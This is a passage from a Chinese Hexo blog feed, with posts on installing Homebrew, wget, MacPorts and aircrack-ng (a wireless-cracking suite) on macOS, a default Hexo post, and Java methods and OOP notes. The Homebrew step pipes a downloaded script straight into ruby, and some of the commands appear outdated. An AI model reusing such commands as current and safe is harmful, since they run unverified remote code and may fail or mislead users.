        <content type="html"><![CDATA[<p>用过 Linux 的大概都觉着没有 wget 的日子是非常难过的，很多程序的安装和更新都可以用一行命令解决，下面介绍 Mac 系统中 wget 命令以及另外几个常用的命令安装方式。</p><span id="more"></span><h2 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h2><blockquote><p>这个命令 Mac 系统自带的，不用安装。</p></blockquote><br>## brew 命令全称：[Homebrew][1]，安装很简单，只需要打开终端窗口，粘贴以下命令回车即可：<pre><code>/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"</code></pre><blockquote><p>啊！这是最容易安装的一个命令了！简直不能再轻松！</p></blockquote><br>## wget 命令没有 wget 的日子是非常难过的，用了好几种办法安装 wget 都不好使，实践证明使用 brew 命令轻松搞定！<pre><code>brew install wget --with-libressl</code></pre><blockquote><p>我不会告诉你我是为了安装 wget 才安装了 Homebrew 的……</p></blockquote><br>## port 命令全称：[MacPorts][2],安的我头都大了……<p><strong>1. 需要先安装 Xcode 和 Xcode Command Line Tools</strong></p><p><strong>2. 还要通过在终端中输入下面的命令同意 Xcode 许可：</strong></p><pre><code>sudo xcodebuild -license</code></pre><p><strong>3. 利用 wget 命令输入下面的命令安装 2.4.1 版本的 MacPorts：</strong></p><pre><code>wget http://distfiles.macports.org/MacPorts/MacPorts-2.4.1.tar.gztar zxvf MacPorts-2.4.1.tar.gzcd MacPorts-2.4.1./configuremakesudo make install</code></pre><p><strong>4. 安装成功后返回上级目录，删除 MacPorts2.4.1 文件和安装包：</strong></p><pre><code>cd ../rm -rf MacPorts-2.4.1*    </code></pre><p><strong>5. 编辑 <code>/etc/profile</code> 文件，将 <code>/opt/local/bin</code> 和 <code>opt/local/sbin</code> 添加到 $PATH 搜索路径中：</strong></p><pre><code>export PATH="/opt/local/bin:$PATH"export PATH="/opt/local/sbin:$PATH"</code></pre><blockquote><p>不知道是不是我脸黑，使用了各种安装包都安装失败 orz……</p></blockquote><br>## aircrack-ng 命令<p>只需要利用 port 命令在终端中输入下面的命令即可安装：</p><pre><code>sudo port install aircrack-ng</code></pre>]]></content>
      
      
      <categories>
          
          <category> 触类旁通 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令行 </tag>
            
            <tag> 终端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2017/03/10/hello-world/"/>
      <url>/2017/03/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><span id="more"></span><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 触类旁通 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 建站 </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>方法及修饰符</title>
      <link href="/2017/03/01/fang-fa-ji-xiu-shi-fu/"/>
      <url>/2017/03/01/fang-fa-ji-xiu-shi-fu/</url>
      
        <content type="html"><![CDATA[<p>Java 中定义一个方法的格式大概如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">访问权限修饰符 修饰符 返回类型 方法名<span class="token punctuation">(</span>参数类型 参数名<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//参数个数 &gt;= 0</span>    方法体<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><span id="more"></span><h2 id="访问权限修饰符："><a href="#访问权限修饰符：" class="headerlink" title="访问权限修饰符："></a>访问权限修饰符：</h2><ul><li><strong>public</strong> 共有的：意味着任何类的任何方法都可以调用这些实例域或方法</li><li><strong>private</strong> 私有的：意味着只有类自身的方法能够访问这些实例域或方法，而其他类的方法不能够读写这些实例域或方法</li><li><strong>protected</strong> 受保护的：意味着只有同一个包内的方法和子类的方法可以调用这些实例域或方法</li><li><strong>无修饰符则对本包可见(默认)</strong></li></ul><p>上表格更清楚些~</p><table><thead><tr><th align="center">修饰符</th><th align="center">本类</th><th align="center">同包类</th><th align="center">子类</th><th align="center">其他类</th></tr></thead><tbody><tr><td align="center">public</td><td align="center">可以访问</td><td align="center">可以访问</td><td align="center">可以访问</td><td align="center">可以访问</td></tr><tr><td align="center">protected</td><td align="center">可以访问</td><td align="center">可以访问</td><td align="center">可以访问</td><td align="center"><font color="red">不能访问</font></td></tr><tr><td align="center">无（默认）</td><td align="center">可以访问</td><td align="center">可以访问</td><td align="center"><font color="red">不能访问</font></td><td align="center"><font color="red">不能访问</font></td></tr><tr><td align="center">private</td><td align="center">可以访问</td><td align="center"><font color="red">不能访问</font></td><td align="center"><font color="red">不能访问</font></td><td align="center"><font color="red">不能访问</font></td></tr></tbody></table><p><strong>访问修饰符也可以修饰类</strong><br>private 和 protected 只能修饰<strong>内部类（类的内部定义的类）</strong><br>public 和 默认既可以修饰内部类，也可以修饰外部类。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Class</span> <span class="token punctuation">{</span>    <span class="token keyword">class</span> 内部类<span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> 外部类 <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>可以用 public 标记实例域，但这是一种极为不提倡的做法。public 数据域允许程序中的任何方法对其进行读取和修改。这就完全破坏了封装。任何类的任何方法都可以修改 public 域，意味着某些代码将使用这种存取权限，所以强烈建议将实例域标记为 private。</p></blockquote><br>## 静态修饰符 static### 静态域（静态变量）如果将域定义为 static，则**每个类中只有一个这样的变量**。而每一个对象对于所有的实例域（成员变量）却都有自己的一份拷贝。例如，需要给每一个蜜蜂赋予唯一的标识码：<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Bee</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> nextId <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在，<strong>每一个蜜蜂对象都有一个自己的 id 域，但这个类的所有实例（所有蜜蜂）将共享一个 nextId 域。</strong>换句话说，如果有 1000 个 Bee 类的对象，择优 1000 个实例域 id。但是，只有一个静态域 nextId。<strong>即使没有一个 Bee 对象，静态域 nextId 也存在。它属于类，而不属于任何一个独立的对象。</strong></p><br>### 静态常量静态变量是用的比较少，但静态常量(static final)却使用的比较多。如 Math 类中定义了一个静态常量：<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Math</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">double</span> <span class="token constant">PI</span> <span class="token operator">=</span> <span class="token number">3.14159265358979323846</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在程序中，可以采用 Math.PI 的形式获得这个常量。</p><blockquote><p>前面说过，由于每个类对象都可以对公有域（public 修饰的域）进行修改，所以最好不要讲域设计为 public。然而，共有常量（final）却没问题，因为 PI 被声明为 final，所以不允许被修改。</p></blockquote><br>### 静态方法**被 static 修饰的方法就是静态方法。静态方法是一种不能向对象实施操作的方法。**换句话说，静态方法没有隐式的参数（没有 this）。静态方法的调用方式为：<pre class="line-numbers language-java" data-language="java"><code class="language-java">类名<span class="token punctuation">.</span>静态方法名<span class="token punctuation">(</span>参数<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如 Math 类的 pow 方法就是一个静态方法：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>计算幂 $$ x^a $$ 在运算时，不使用任何 Math 对象，换句话说，<strong>静态方法没有隐式参数</strong>（即静态方法是没有 this 参数的方法）</p><p>Bee 类的<strong>静态方法不能访问 id 实例域，因为它不能操作对象。但是静态方法可以访问自身类中的静态域：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getNextId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> nextId<span class="token punctuation">;</span><span class="token comment">//返回静态域</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以通过类名调用这个方法：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token class-name">Bee</span><span class="token punctuation">.</span><span class="token function">getNextId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这个方法可以省略关键字 static，但是需要通过 Bee 类<strong>对象</strong>的引用调用这个方法。</p><p><del>此外，可以使用对象调用静态方法，但是不推荐。例如 b 是一个 Bee 对象，可以用<code>b.getNextId()</code> 代替<code>Bee.getNextId()</code>。但是这种方式很容易造成混淆，原因是 getNextId 方法计算的结果与 b 毫无关系。所以建议使用类名来调用静态方法。</del></p></blockquote><br>## final 修饰符### final 类与 final 方法**不允许被继承的类称为 final 类：**<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">Bee</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">extends</span> <span class="token class-name">FlyObject</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>同样，类中的方法也可以被声明为 final。<strong>子类不能重写父类中的 final 方法。</strong></p><blockquote><p>将方法或类声明为 final 的主要目的是确保它们不会在子类中改变语义。</p></blockquote><br>### final 常量- 静态必须在声明的同时初始化，而非静态常量可以不用在声明时初始化。- 静态常量命名习惯上将所有字母都大写。<p>具体请参考之前的笔记《<a href="/2017/02/23/%E5%8F%98%E9%87%8F%E4%B8%8E%E5%B8%B8%E9%87%8F/#%E5%B8%B8%E9%87%8F">变量与常量</a>》</p><br>## 返回类型**注明该方法需要返回的数据类型，如果该方法不需要返回任何数据则返回类型写 void。**<h3 id="方法的结果返回"><a href="#方法的结果返回" class="headerlink" title="方法的结果返回"></a>方法的结果返回</h3><p><strong>return：结束该方法并返回方法的操作结果</strong>，如果该方法是有返回值，则通过</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">return</span> 结果<span class="token punctuation">;</span><span class="token comment">//返回的结果数据类型必须和该方法标明的返回类型相同</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将结果返回出去。若该方法没有返回值（void）则可以不写 return，或使用</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">return</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来提前结束方法的执行。</p><br>## 方法名用户自定义方法的名字，习惯上把第一个单词小写，之后每个单词首字母大写。<br>## 参数<p><strong>方法可以有个 0~n 个参数，每个参数都需要指定参数类型，并且用”,”隔开每个参数</strong><br><strong>形参</strong>：在定义方法的时候定义的参数</p><p><strong>实参</strong>：调用方法的时候传入的实际参数</p><p>Java 中调用方法时，传给方法的是实参，而<strong>方法得到的参数值是所有实参的一个拷贝(形参)，也就是一个方法不能修改传递给它的基本数据类型参数变量的值。</strong>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addFive</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    x <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"形参 x 的值："</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token class-name">X</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token function">addFive</span><span class="token punctuation">(</span><span class="token class-name">X</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里将输出“形参 x 的值：10”</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"实参 X 的值："</span> <span class="token operator">+</span> <span class="token class-name">X</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//此时 X 还是 5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，无论怎样，调用这个方法之后，X 的值还是 5。</p><p><strong>然而，方法参数共有两种类型：</strong></p><ul><li>基本数据类型</li><li>对象引用类型</li></ul><p><strong>如果参数是对象引用作类型，则可以很容易的实现改变对象参数状态</strong>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initLocation</span><span class="token punctuation">(</span><span class="token class-name">Bee</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    b<span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    b<span class="token punctuation">.</span>y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token class-name">Bee</span> bee <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Bee</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//构造一个初始坐标为 1, 2 的 Bee 对象</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"bee 的坐标："</span> <span class="token operator">+</span> bee<span class="token punctuation">.</span>x <span class="token operator">+</span> <span class="token string">"  "</span> <span class="token operator">+</span> bee<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出当前坐标为 1, 2</span><span class="token function">initLocation</span><span class="token punctuation">(</span>bee<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"bee 的坐标："</span> <span class="token operator">+</span> bee<span class="token punctuation">.</span>x <span class="token operator">+</span> <span class="token string">"  "</span> <span class="token operator">+</span> bee<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//此时输出当前坐标为 0, 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>该代码具体的执行过程为：</strong></p><ol><li>b 被初始化为<strong>bee 值的拷贝</strong>，这里是一个对象的引用。</li><li>initLocation 方法应用于这个对象引用。 <strong>b 和 bee 同时引用</strong>的那个 Bee 对象的坐标改为了 0,0 </li><li><strong>方法结束后， 参数变量 b 不再使用</strong>，但是变量 bee 继续引用那个坐标改为 0,0 的 Bee 对象。</li></ol><p>为了理解<strong>形参是实参的拷贝</strong>，再举个例子：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> swap <span class="token punctuation">(</span><span class="token class-name">Bee</span> a<span class="token punctuation">,</span> <span class="token class-name">Bee</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//交换两个对象</span>    <span class="token class-name">Bee</span> temp <span class="token operator">=</span> a<span class="token punctuation">;</span>    a <span class="token operator">=</span> b<span class="token punctuation">;</span>    b <span class="token operator">=</span> temp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//定义两个 Bee 对象</span><span class="token class-name">Bee</span> beea <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Bee</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Bee</span> beeb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Bee</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"beea 的坐标为"</span> <span class="token operator">+</span> beea<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"  beeb 的坐标为"</span> <span class="token operator">+</span> beeb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">swap</span><span class="token punctuation">(</span>beea<span class="token punctuation">,</span>beeb<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用方法打断交换 beea 和 beeb 的值</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"beea 的坐标为"</span> <span class="token operator">+</span> beea<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"  beeb 的坐标为"</span> <span class="token operator">+</span> beeb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>然而上面这段代码输出的两个结果是完全一样的。这个 swap 方法并没有改变储存在变量 beea 和 beeb 中的对象引用。swap 方法的参数 a 和 b 被初始化为两个对象引用的拷贝，交换的也是两个对象的拷贝。原来的变量 beea 和 beeb 仍然引用调用方法之前所引用的对象。</strong></p><blockquote><p>哈哈 有点绕，晕了的话多看几遍~</p></blockquote><p><strong>总结一下 Java 参数的使用情况：</strong></p><ul><li><strong>一个方法不能修改一个基本数据类型的参数（即数值型和布尔型）。</strong></li><li><strong>一个方法可以改变一个对象参数的状态。</strong></li><li><strong>一个方法不能让对象参数引用一个新的对象</strong></li></ul><br>## 方法体就是这个方法需要做的事咯！具体要做啥那是你的事~<br>## 方法的调用方法是需要被调用才能执行的。]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 方法 </tag>
            
            <tag> 修饰符 </tag>
            
            <tag> 访问权限 </tag>
            
            <tag> 参数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面向对象（一）</title>
      <link href="/2017/02/28/mian-xiang-dui-xiang-yi/"/>
      <url>/2017/02/28/mian-xiang-dui-xiang-yi/</url>
      
        <content type="html"><![CDATA[<p>面向对象程序设计简称 <strong>OOP</strong></p><blockquote><p>面向对象的程序是由对象组成的，每个对象包含对用户公开的特定功能部分和隐藏的实现部分。程序中的很多对象来自标准库，还有一些是自定义的。究竟是自己构造对象，还是从外界购买对象完全取决于开发项目的预算时间。在 <strong>OOP</strong> 中，不必管新对象的具体实现，只要能够满足用户的需求即可。</p></blockquote><p style="text-align: right; font-style: italic;">—— 摘自《Core Java》</p><span id="more"></span><p>什么是对象？<br>对象：现实世界中真实存在的个体称为对象。Java 中一切皆对象！</p><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><ul><li><strong>类（class）</strong>是构造对象的模板或蓝图。由类<strong>构造（construct）</strong>对象的过程称为创建类的<strong>实例（instance）</strong></li><li>对象中的数据称为<strong>实例域（instance field，有时称为成员变量）</strong>，操纵数据的过程称为<strong>方法（method）</strong></li><li>每个特定的类实例（对象）都有一组特定的实例域值，这些值的集合就是这个对象的当前<strong>状态（state）</strong></li></ul><p><strong>OOP</strong> 让用户自定义 Java 类的时候更加容易：可以通过扩展一个类来建立另外一个新的类（继承），在 Java 中，所有的类都源自于一个“神通广大的超类”，它就是 Object。</p><h3 id="封装（encapsulation，有时称为数据隐藏）："><a href="#封装（encapsulation，有时称为数据隐藏）：" class="headerlink" title="封装（encapsulation，有时称为数据隐藏）："></a>封装（encapsulation，有时称为数据隐藏）：</h3><p><strong>封装</strong>是与对象有关的一个重要概念。</p><blockquote><p>实现封装的关键在于<strong>绝对不能</strong>让类中的方法直接的访问其他类的实例域。程序<strong>仅通过</strong>对象的方法与对象数据进行交互。<br>封装给对象赋予了“黑盒”特征，这事提高重用性和可靠性的关键。</p></blockquote><p><strong>一个好的封装需要下面三个内容：</strong></p><ul><li>一个<strong>私有的</strong>数据域；</li><li>一个<strong>共有的</strong>域访问器方法；</li><li>一个<strong>共有的</strong>域更改器方法；</li></ul><p><strong>这样做要比提供一个简单的共有数据域复杂些，但是却有更大的好处：</strong></p><ul><li><p><strong>可以改变内部实现，出了该类的方法之外，不会影响其他代码</strong>。<br>例如：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">String</span> firstName<span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token class-name">String</span> lastName<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那么可以写一个 getName 方法获得全名：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> firstName <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> lastName<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>对于这点改变，程序的其他部分完全不可见。</p></li><li><p><strong>更改器方法可以执行错误检查，然而直接对实例域进行赋值将不会进行这些处理。</strong></p><blockquote><p>当然这些错误检查及如何处理是你自己写的~人家怎么知道你想怎么检查错误以及如何处理呢。</p></blockquote></li></ul><p><strong>警告：</strong><br><strong>不要编写返回 引用可变对象 的访问器方法。如果确实需要返回一个 可变对象 的引用，应该使用拷贝。</strong></p><br>## 对象 ##要想使用 OOP，一定要清楚对象的三个主要特征：<ul><li><strong>对象的行为（behavior）</strong>——可以对对象施加哪些操作，或者可以对对象施加哪些方法？（方法）</li><li><strong>对象的状态（state）</strong>——当施加那些方法时，对象如何响应？（变量）</li><li><strong>对象标识（identity）</strong>——如何辨别具有相同行为与状态的不同对象？</li></ul><blockquote><p>对象状态的改变必须通过调用方法实现（如果不经过方法调用就可以改变对象状态，只能说明封装性遭到了破坏）<br>作为一个类的实例，每个对象的标识<strong>永远</strong>是不同的，状态常常也存在着差异。例如在一个订单系统中，任何两个订单都存在这不同之处，即使所订购的货物完全相同也是如此。</p></blockquote><br>### 程序设计时，把什么创建成类？###设计一个程序时，首先是从设计类开始的，然后再往每个类中添加方法。但是，应当把什么当做类来创建呢？**识别类的简单规则就是在分析问题的过程中寻找名词，而类的方法对应着动词。**例如，飞机，子弹...这些名词很可能成为类 Plane、Bullet 等。接下来找动词：飞机发射子弹，飞机移动等。对于每一个动词如“发射”、“移动”等，都是该对象完成相应的动作。<br>## 类之间的关系 ##- **依赖（使用一个类）**- **聚合（包含一个类）**- **继承（就是这个类）**<h3 id="依赖："><a href="#依赖：" class="headerlink" title="依赖："></a>依赖：</h3><p><strong>依赖（dependence）</strong>是一种最明显的、最常见的关系。如果一个类 A 的方法操纵另一个类 B 的对象，就是类 A 依赖于类 B。</p><blockquote><p><strong>应该尽可能的将互相依赖的类减至最少</strong>，如果类 A 不知道类 B 的存在，它就不会关心 B 的任何改变（这意味着 B 的改变不会导致 A 产生任何 bug）。</p></blockquote><h3 id="聚合："><a href="#聚合：" class="headerlink" title="聚合："></a>聚合：</h3><p><strong>聚合（aggregation）</strong>是一种具体且易于理解的关系。即：一个 A 对象（如订单）包含一些 B 对象（如商品）。</p><h3 id="继承："><a href="#继承：" class="headerlink" title="继承："></a>继承：</h3><p><strong>继承（inheritance）</strong>是一种用于表示特属于一般关系的。</p><ul><li>若类 A 继承于类 B，则称类 A 为类 B 的子类，类 B 为类 A 的父类。</li><li>子类继承父类后，拥有父类<strong>所有</strong>的属性及方法，同时也拥有自己特有的属性及方法</li><li>作用：提高代码的复用性，避免代码重复</li><li>Java 是单一继承的,即一个子类只能继承一个父类。</li></ul><p>语法：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">子类 <span class="token keyword">extends</span> 父类<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>## 对象与对象变量 ##要想使用对象，就必须先构造对象，并指定其初始状态，然后对对象应用方法。在 Java 中，使用**构造器（constructor）**构造新实例。<h3 id="构造器："><a href="#构造器：" class="headerlink" title="构造器："></a>构造器：</h3><p><strong>构造器是描述对象的创建过程，每一个类都有构造器：</strong></p><ul><li>构造器与类同名</li><li>构造器没有返回值，也不能有 void</li><li>通常构造器是来给类的属性赋初始值的</li><li>构造器总是伴随着 new 操作符一起调用</li><li>每个类可以有一个以上的构造器（<strong>即可以重载</strong>）</li><li>构造器可以有 0 个、1 个或多个参数</li></ul><p>如果编写一个类时没有编写构造器，那么系统会提供一个无参数构造器。这个构造器将所有的实例域设置为默认值。<strong>仅当类没有提供任何构造器的时候，系统才会提供一个默认的构造器</strong></p><blockquote><p>如何创建<strong>对象实例</strong>（语法）：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">new</span> 对象名<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//创建名为“对象名”的实例对象，但是这个对象没有引用，后期若想操作这个对象，则应声明对象：</span>对象名 变量名 <span class="token operator">=</span> <span class="token keyword">new</span> 对象名<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建名为"对象名"的实例对象，同时将该对象赋值给引用类型变量“变量名”</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>构造器与其他的方法有一个重要的不同：<strong>构造器总是伴随着 new 操作符的执行被调用</strong>，而不能对一个已经存在的对象调用构造器来达到重新设置实例域的目的：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Bee</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Bee</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token 